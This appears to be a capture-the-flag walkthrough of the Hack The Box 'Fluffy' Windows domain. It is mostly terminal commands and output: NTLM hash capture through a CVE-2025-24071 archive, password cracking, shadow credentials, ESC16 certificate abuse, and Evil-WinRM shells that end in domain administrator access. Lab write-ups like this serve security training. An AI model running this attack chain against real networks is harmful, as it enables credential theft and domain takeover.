@@ -1,0 +1,338 @@
+
+
+
+As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: 
+j.fleischman / J0elTHEM4n1990!
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.11.69/ -U j.fleischman
+Password for [WORKGROUP\j.fleischman]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	IT              Disk      
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.11.69/IT -U j.fleischman
+Password for [WORKGROUP\j.fleischman]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon May 19 10:27:02 2025
+  ..                                  D        0  Mon May 19 10:27:02 2025
+  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
+  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
+  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
+  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
+  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025
+
+
+
+Upgrade Notice has a couple of CVE's listed for fixing.
+
+The first, CVE-2025-24071, is our interest.
+
+https://github.com/0x6rss/CVE-2025-24071_PoC/tree/main
+"Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak."
+"Microsoft has changed its CVE number. The CVE number previously defined by Microsoft, CVE-2025-24071, has been updated to CVE-2025-24054."
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 24071.py 
+Enter your file name: exploit
+Enter IP (EX: 192.168.1.162): 10.10.14.28
+completed
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# responder -I tun0
+                                  
+
+smb: \> put exploit.zip
+putting file exploit.zip as \exploit.zip (0.2 kb/s) (average 0.2 kb/s)
+smb: \> 
+
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:784a2e68ddda4302:B8F7489B27C3EF7F7C4F4C7632EC3A8F:0101000000000000005CA9737146DC01E2FAC4DD12AEABDE00000000020008004800560038004A0001001E00570049004E002D004A00460032004F00320049003000520042004D00530004003400570049004E002D004A00460032004F00320049003000520042004D0053002E004800560038004A002E004C004F00430041004C00030014004800560038004A002E004C004F00430041004C00050014004800560038004A002E004C004F00430041004C0007000800005CA9737146DC0106000400020000000800300030000000000000000100000000200000B964FDB99BC3784B495653FF585C1091887CACBC3A8F7727C18C16DDF98D5BF70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'p.agila::FLUFFY:784a2e68ddda4302:B8F7489B27C3EF7F7C4F4C7632EC3A8F:0101000000000000005CA9737146DC01E2FAC4DD12AEABDE00000000020008004800560038004A0001001E00570049004E002D004A00460032004F00320049003000520042004D00530004003400570049004E002D004A00460032004F00320049003000520042004D0053002E004800560038004A002E004C004F00430041004C00030014004800560038004A002E004C004F00430041004C00050014004800560038004A002E004C004F00430041004C0007000800005CA9737146DC0106000400020000000800300030000000000000000100000000200000B964FDB99BC3784B495653FF585C1091887CACBC3A8F7727C18C16DDF98D5BF70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000' >hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+prometheusx-303  (p.agila)     
+1g 0:00:00:01 DONE (2025-10-26 12:11) 0.6024g/s 2721Kp/s 2721Kc/s 2721KC/s proquis..programmercomputer
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u p.agila -p 'prometheusx-303' -d fluffy.htb -c all -ns 10.10.11.69 -dc dc01.fluffy.htb --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: fluffy.htb
+INFO: Getting TGT for user
+
+
+
+GenericAll
+
+┌──(root㉿kali)-[/home/kali]
+└─# net rpc group addmem "service accounts" "p.agila" -U "FLUFFY/p.agila%prometheusx-303" -S dc01.fluffy.htb
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+This group has GenericWrite over CA_SVC, LDAP_SVC, and WINRM_SVC
+
+bloodyAD may be used insted of the following, and makes the job easier by just giving us the hash.
+
+┌──(root㉿kali)-[/home/kali]
+└─# pywhisker -d fluffy.htb -u p.agila -p 'prometheusx-303' --target WINRM_SVC --action add                 
+[*] Searching for the target account
+[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 223b6425-dc74-cb2b-9a99-d663086aa6e6
+[*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: d8z6bgjN.pfx
+[*] Must be used with password: fhZ68kpDw0uffh3dGyPR
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# ntpdate 10.10.11.69;certipy-ad auth -pfx d8z6bgjN.pfx -password 'fhZ68kpDw0uffh3dGyPR' -domain fluffy.htb -username WINRM_SVC -dc-ip 10.10.11.69
+2025-10-26 19:46:43.850613 (-0400) +25204.982013 +/- 0.012185 10.10.11.69 s1 no-leap
+CLOCK: time stepped by 25204.982013
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
+
+
+for priv esc we go back to CA_SVC
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '701f7e17-f50a-0725-a83f-6428df915c2a'
+[*] Adding Key Credential with device ID '701f7e17-f50a-0725-a83f-6428df915c2a' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '701f7e17-f50a-0725-a83f-6428df915c2a' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled -stdout                         
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+For ESC16, you can use certipy-ad to request a certificate as a high-privileged user (like Administrator) even if you are not in the right group, due to the missing security extension.
+
+
+
+dn: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+changetype: modify
+replace: userPrincipalName
+userPrincipalName: administrator
+
+┌──(root㉿kali)-[/home/kali]
+└─# ldapmodify -x -H ldap://10.10.11.69 -D "FLUFFY\p.agila" -w 'prometheusx-303' -f upn.ldif                
+modifying entry "CN=certificate authority service,CN=Users,DC=fluffy,DC=htb"
+
+
+or, we could have used
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
+
+"Then, a certificate should be requested as the ca_svc user. Since the ca_sv c user's UPN has been updated
+to administrator , the resulting certificate will allow us to authenticate as the administrator user. Note
+that the User template (a default template in the CA ) is used here."
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -ca fluffy-DC01-CA -template User -dc-ip 10.10.11.69
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 17
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+We must change the UPN of the ca_svc back to the correct one.
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'                             
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name            SID
+==================== ============================================
+fluffy\administrator S-1-5-21-497550768-2797716248-2627064577-500
+
+
+
+
+
+
+
